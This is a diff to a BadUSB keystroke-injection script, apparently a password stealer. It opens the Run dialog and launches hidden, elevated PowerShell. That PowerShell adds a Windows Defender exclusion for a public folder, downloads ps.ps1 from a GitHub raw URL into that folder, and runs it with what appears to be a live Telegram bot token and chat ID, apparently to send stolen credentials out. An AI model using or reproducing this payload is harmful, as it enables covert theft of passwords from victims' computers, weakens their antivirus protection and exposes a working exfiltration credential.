@@ -34,7 +34,23 @@ GUI r
 DELAY 500
 
 REM Execute PowerShell hidden with administrative privileges
-STRING powershell -NoP -Ep Bypass -Command "$script = [ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/refs/heads/main/ps.ps1')); & $script -Token 'TOKEN' -ChatID 'CHAT_ID'"
+STRING powershell -w h -NoP -Ep Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'; iwr 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/refs/heads/main/ps.ps1' -O 'C:\Users\Public\Documents\ps.ps1'"
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+
+REM Minimize all active windows
+GUI d
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Execute PowerShell hidden with administrative privileges
+STRING powershell -w h -NoP -Ep Bypass -Command "& 'C:\Users\Public\Documents\ps.ps1' -Token '6659995323:AAFNA_LCQ229saLyMhV-Ptbqx8pPrWDM5fk' -ChatID '749758516'"
 CTRL-SHIFT ENTER
 DELAY 1000
 LEFT
